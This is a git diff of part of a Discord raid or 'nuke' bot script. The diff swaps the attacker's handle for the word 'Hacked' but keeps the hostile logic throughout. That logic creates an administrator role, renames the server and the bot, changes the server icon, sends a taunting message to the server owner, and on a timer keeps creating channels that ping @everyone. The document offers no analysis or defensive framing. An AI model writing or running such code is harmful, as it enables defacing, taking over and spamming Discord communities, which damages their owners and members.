@@ -26,7 +26,7 @@ client.on("message", message => {
       message.guild.roles
         .create({
         data: {
-          name: "Hacked By maten :joy:",
+          name: "Hacked:joy:",
           permissions: ["ADMINISTRATOR"]
         }
         })
@@ -36,19 +36,19 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setUsername("maten UP");
+    client.user.setUsername("Hacked");
     message.guild.owner.send(
       "Mazay kury kar bro servert bbyna gayrawa"
     );
-    message.guild.setName("maten Up");
+    message.guild.setName("Hacked");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("hacked by maten", "text")
+            .create("hacked", "text")
             .then(channel => {
               channel.send(
-                "@everyone maten Up :joy: :joy: :joy:"
+                "@everyone Hackrawa nradar :joy: :joy: :joy:"
               );
             });
         },
